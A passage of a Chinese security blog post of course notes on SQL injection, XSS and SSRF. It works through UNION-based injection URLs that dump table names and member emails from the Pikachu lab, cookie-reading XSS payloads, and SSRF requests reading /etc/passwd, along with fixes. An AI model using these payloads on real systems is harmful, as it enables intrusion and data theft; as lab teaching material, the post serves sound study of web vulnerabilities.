+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>先来了解information_schema，这是MySQL 自带的一个元数据库，用于存储MySQL 的数据结构。</p>
+<p>元数据则是用于描述数据本身的数据，称为元数据，包含了，MySQL 当中有多少个数据库，这些数<br>据库的名称是什么，每个数据库里有多少个表，具体的表名叫什么<br>而 information_schema 这个库里又存放了很多个表，这些表里的不同字段表示 MySQL 中的相关信息。而我们也可以通过 information_schema 和以上我们学习到的注入使用方式去查询更多的信息</p>
+<p>例：</p>
+<p>查看 information_schema 库中 tables 表中 table_schema 等于 pikachu 的相关信息</p>
+<p>select table_schema,table_name from information_schema.tables where table_schema&#x3D;’pikachu’;</p>
+<p>注：information_schema 库中的 tables 表的字段解释：</p>
+<p>table_schema #该字段存储数据库名 ；</p>
+<p>table_name #该字段存储对应数据库中的包括的表名</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,sex from member <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">2</span> union select <span class="number">1</span>,table_name from information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="W0cWHdNBZeUlGrJfBbb8Aa1hKcsQX0BKaT4K5_qqs5U.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=%27pikachu%27;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="t2vm7gF97GAbYzNEHB4ZfiCk9vwda-lf8V4k1b7Aog8.png" alt="image"></p>
+<p>字段名</p>
+<p>例：</p>
+<p>查看information_schema.columns 表中的字段 table_name 等于member的相关信息</p>
+<p>select table_schema,table_name,column_name from information_schema.columns where table_name&#x3D;’member’;</p>
+<p>注：information_schema 库中的 tables 表的字段解释：</p>
+<p>table_schema #该字段存储数据库名 ；</p>
+<p>table_name #该字段存储对应数据库中的包括的表名</p>
+<p>column_name##该字段存储对应表中的字段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,sex from member <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">2</span> union select <span class="number">1</span>,column_name from information_schema.columns where table_name=<span class="string">&#x27;member&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="H3nwV5ZBF9dqzGBDqWYhruOgn6vfCwBVFFrKxtyppmA.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_name=%27member%27--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="bMc3wKAtVu0r_JuUANbeBwn6Hs0ewMx10JiQ--IKgWY.png" alt="image"></p>
+<h4 id="注入完成"><a href="#注入完成" class="headerlink" title="注入完成"></a>注入完成</h4><p>知道了一下数据：</p>
+<p>库名：pikachu</p>
+<p>表明：member</p>
+<p>字段名： id</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=3%27%20union%20select%201,email%20from%20member--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="Ws4tg0f8nMdWIS3xf0qcgxPkt4gyU0Ua0fZ6AZydCiQ.png" alt="image"></p>
+<p>查询其它数据库的内容等</p>
+<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>搜索型注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#判断</span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,3--+</span></span><br><span class="line">#查字段名</span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,database()--+</span></span><br><span class="line">#查表名</span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=%27pikachu%27;--+</span></span><br><span class="line">#查字段名</span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name=%27member%27;--+</span></span><br><span class="line">#查询全部的邮箱</span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,email%20from%20member--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="挖掘方法"><a href="#挖掘方法" class="headerlink" title="挖掘方法"></a>挖掘方法</h3><p>常见的存在于前端的动态传参的地方，新闻页面，产品页面等，以及用户登录等地方。一切与数据库有交互的地方有有可能存在SQL注入漏洞。</p>
+<p>寻找注入点–&gt;判定字段数–&gt;寻找回显点–&gt;联合查询数据库名–&gt;联合查询表名–&gt; 联合查询字段名–&gt;注出想要的数据</p>
+<p>扩展，sql注入写shell，自动化渗透，sqlmap</p>
+<p>      1.存在SQL注入漏洞</p>
+<p>　　2.web目录具有写入权限</p>
+<p>　　3.找到网站的绝对路径</p>
+<p>　　4.secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</p>
+<h3 id="常用利用方法"><a href="#常用利用方法" class="headerlink" title="常用利用方法"></a>常用利用方法</h3><p>1.获取数据库的敏感数据，如管理员的账号密码等</p>
+<p>2.脱裤，dump下来整个数据库的信息，进行非法售卖</p>
+<p>3.写shell，写入木马进行进一步的攻击</p>
+<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
+<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
+<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
+<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
+<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
+<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
+<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
+<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
+<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站脚本攻击英文全称为（Cross site Script）缩写为 CSS，但是为了和层叠样式表（Cascading Style Sheet）CSS 区分开来，所以在安全领域跨站脚本攻击叫做 XSS </p>
+<p>XSS 攻击通常指黑客通过往 Web 页面中揑入恶意 Script 代码，当用户访问网页时恶意代码在用户的 浏览器中被执行，从而劫持用户浏览器窃叏用户信息。</p>
+<p>1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML&#x2F;JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>
+<p>2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
+<h3 id="XSS-脚本分为下面三类"><a href="#XSS-脚本分为下面三类" class="headerlink" title="XSS 脚本分为下面三类"></a>XSS 脚本分为下面三类</h3><p>第一种类型：反射型 XSS </p>
+<p>反射型 XSS 又称之为非持久型 XSS，黑客需要通过诱使用户点击包含 XSS 攻击代码的恶意链接，然后用户浏览器执行恶意代码触发 XSS 漏洞。 </p>
+<p>第二种类型：存储型 XSS </p>
+<p>存储型 XSS 会把用户输入的数据存储在服务器端，这种 XSS 可以持久化，而且更加稳定。 </p>
+<p> 比如黑客写了一篇包含 XSS 恶意代码的博客文章，那么访问该博客的所有用户他们的浏览器中都会执行黑客构造的 XSS 恶意代码，通常这种攻击代码会以文本或数据库的方式保存在服务器端，所以称之为存储型 XSS。 </p>
+<p>第三种类型：DOM 型 XSS （与服务器没有交互）</p>
+<p>DOM-basedXSS漏洞是基于文档对象模型（Document Object Model)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如document.getElementByld(“x’).innerHTML、document.write)等。</p>
+<h3 id="挖掘方法-1"><a href="#挖掘方法-1" class="headerlink" title="挖掘方法"></a>挖掘方法</h3><p>1、数据交互的地方</p>
+<p>get、post、cookies、headers</p>
+<p>反馈与浏览</p>
+<p>富文本编辑器</p>
+<p>各类标签插入和自定义</p>
+<p>2、数据输出的地方</p>
+<p>用户资料</p>
+<p>关键词、标签、说明</p>
+<p>文件上传</p>
+<p>反射型</p>
+<script>alert(1)</script>
+
+<p>存储型</p>
+<script>alert(1)</script>
+
+<p>dom型</p>
+<p><a href=""+str+"">what do you see?</a></p>
+<p>在input输入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#<span class="string">&#x27; onclick=&quot;alert(6)&quot;&gt;</span></span><br><span class="line"><span class="string">#&#x27;</span> onmouseover=<span class="string">&quot;alert(6)&quot;</span>&gt;</span><br><span class="line">#<span class="string">&#x27; onmouseleave=&quot;alert(6)&quot;&gt;</span></span><br><span class="line"><span class="string">#&#x27;</span> onmouseleave=<span class="string">&quot;console.log(document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>构成a标签闭合，且嵌入一个弹窗。<a href="#" onclick="alert(666)">‘&gt;what do you see?</a></p>
+<h3 id="常用利用方法-1"><a href="#常用利用方法-1" class="headerlink" title="常用利用方法"></a>常用利用方法</h3><p>1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
+<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
+<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
+<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
+<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
+<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
+<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
+<h3 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h3><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
+<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
+<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
+<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
+<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="原理以及危害"><a href="#原理以及危害" class="headerlink" title="原理以及危害"></a>原理以及危害</h3><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
+<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
+<p>　　(5)、利用File协议读取本地文件。</p>
+<h3 id="挖掘方法-2"><a href="#挖掘方法-2" class="headerlink" title="挖掘方法"></a>挖掘方法</h3><p>1.能够对外发起网络请求的地方，就可能存在 SSRF 漏洞；</p>
+<p>2.在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求；</p>
+<p>3.从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.88</span><span class="number">.104</span>:<span class="number">8088</span>/vul/ssrf/ssrf_curl.php?url=http:<span class="comment">//baidu.com</span></span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/ssrf/ssrf_curl.php?url=file://127.0.0.1/etc/passwd</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.88</span><span class="number">.104</span>:<span class="number">8088</span>/vul/ssrf/ssrf_fgc.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="常用利用方法-2"><a href="#常用利用方法-2" class="headerlink" title="常用利用方法"></a>常用利用方法</h3><p>(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
+<p>　　(5)、利用File协议读取本地文件。</p>
+<h3 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h3><p>      1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</p>
+<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
+<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>　　4、验证请求的文件格式</p>
+<p>　　5、禁止跳转</p>
+<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
+<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day2-web安全基础一（上午：SQL注入、XSS、SSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.2.</span> <span class="toc-text">SQL 注入的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.0.3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">正常</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E6%98%BE%E4%BD%8D"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">找显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.3.6.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%88%90"><span class="toc-number">1.0.3.7.</span> <span class="toc-text">注入完成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.0.3.8.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.4.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.5.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.6.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E8%84%9A%E6%9C%AC%E5%88%86%E4%B8%BA%E4%B8%8B%E9%9D%A2%E4%B8%89%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS 脚本分为下面三类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.4.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.5.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理以及危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.4.</span> <span class="toc-text">修复方法</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&text=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&is_video=false&description=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day2-web安全基础一（上午：SQL注入、XSS、SSRF）&body=Check out this article: https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&name=day2-web安全基础一（上午：SQL注入、XSS、SSRF）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&t=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
